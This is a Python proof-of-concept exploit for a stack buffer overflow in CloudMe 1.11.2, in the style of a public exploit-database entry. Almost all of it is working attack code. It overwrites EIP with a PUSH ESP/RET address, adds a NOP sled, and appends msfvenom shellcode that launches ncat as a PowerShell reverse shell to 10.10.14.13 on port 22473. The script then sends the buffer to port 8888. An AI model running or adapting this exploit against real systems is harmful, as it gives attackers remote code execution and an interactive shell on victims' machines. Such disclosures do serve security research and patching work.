# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket
import sys

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD="C:\xampp\htdocs\gym\upload\ncat.exe 10.10.14.13 22473 -e powershell" -b '\x00\x0A\x0D' -f python
payload  = b"\xdb\xcc\xd9\x74\x24\xf4\x5a\x31\xc9\xb1\x40\xbe\x91"
payload += b"\xee\xc1\xa9\x83\xea\xfc\x31\x72\x13\x03\xe3\xfd\x23"
payload += b"\x5c\xff\xea\x26\x9f\xff\xea\x46\x29\x1a\xdb\x46\x4d"
payload += b"\x6f\x4c\x77\x05\x3d\x61\xfc\x4b\xd5\xf2\x70\x44\xda"
payload += b"\xb3\x3f\xb2\xd5\x44\x13\x86\x74\xc7\x6e\xdb\x56\xf6"
payload += b"\xa0\x2e\x97\x3f\xdc\xc3\xc5\xe8\xaa\x76\xf9\x9d\xe7"
payload += b"\x4a\x72\xed\xe6\xca\x67\xa6\x09\xfa\x36\xbc\x53\xdc"
payload += b"\xb9\x11\xe8\x55\xa1\x76\xd5\x2c\x5a\x4c\xa1\xae\x8a"
payload += b"\x9c\x4a\x1c\xf3\x10\xb9\x5c\x34\x96\x22\x2b\x4c\xe4"
payload += b"\xdf\x2c\x8b\x96\x3b\xb8\x0f\x30\xcf\x1a\xeb\xc0\x1c"
payload += b"\xfc\x78\xce\xe9\x8a\x26\xd3\xec\x5f\x5d\xef\x65\x5e"
payload += b"\xb1\x79\x3d\x45\x15\x21\xe5\xe4\x0c\x8f\x48\x18\x4e"
payload += b"\x70\x34\xbc\x05\x9d\x21\xcd\x44\xc8\xb4\x43\xf3\xbe"
payload += b"\xb7\x5b\xfb\xee\xdf\x6a\x70\x61\xa7\x72\x53\xc5\x57"
payload += b"\x39\xf9\x6c\xf0\xe4\x68\x2d\x9d\x16\x47\x72\x98\x94"
payload += b"\x6d\x0b\x5f\x84\x04\x0e\x1b\x02\xf5\x62\x34\xe7\xf9"
payload += b"\xd1\x35\x22\xba\xef\x95\xb5\x5d\x7d\x56\x36\xc1\x15"
payload += b"\xe2\xd2\x96\x86\x79\x47\x0f\x30\x13\x2b\xba\xb2\x87"
payload += b"\xbc\x25\x57\x04\x2d\xc6\xf6\xc0\x9f\x6d\x81\x4d\xc0"
payload += b"\x5c\x41\xa0\x31\xae\x8f\x8d\x05\xe0\xfe\xde\x45\xce"
payload += b"\x32\x15\xb1\x1d\x13\x78\xd8\x41\x23\xed\x55\xe4\xb1"
payload += b"\x82\xf1\x83\x59\x09\x02"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	print('Connected')
	s.send(buf)
	print('payload sent')
except Exception as e:
	print(sys.exc_value)